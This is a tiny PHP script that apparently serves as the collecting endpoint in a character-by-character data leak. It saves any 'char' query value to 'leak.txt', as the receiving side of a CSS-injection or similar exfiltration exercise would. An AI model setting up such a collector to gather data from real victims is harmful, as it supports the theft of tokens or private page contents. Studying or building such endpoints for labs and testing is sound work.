<?php
    if(isset($_GET['char'])) {
        $file = 'leak.txt';
        file_put_contents($file, $_GET['char']);
    }
?>